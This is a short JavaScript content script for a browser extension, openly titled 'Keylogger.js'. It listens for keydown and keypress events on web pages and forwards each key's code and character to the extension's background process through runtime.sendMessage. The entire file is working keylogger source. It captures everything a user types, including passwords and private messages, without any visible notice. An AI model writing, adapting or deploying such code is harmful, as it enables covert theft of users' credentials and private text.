console.log("Keylogger.js extension go");

//save and send key press by user
window.addEventListener('keydown' , keyloggerDown); 

window.addEventListener('keypress' , keyloggerPress); 


//functions
function keyloggerDown(key){
    let mensaje={
        txt: "keydown",
        keyCode: key.keyCode,
        charCode: key.charCode,
        which: key.which,
        chr: key.key
    }
        
    detectBrowser.runtime.sendMessage(mensaje);
   
}

function keyloggerPress(key){
    let mensaje={
        txt: "keypress",
        keyCode: key.keyCode,
        charCode: key.charCode,
        which: key.which,
        chr: key.key
    }

    detectBrowser.runtime.sendMessage(mensaje);
   
}
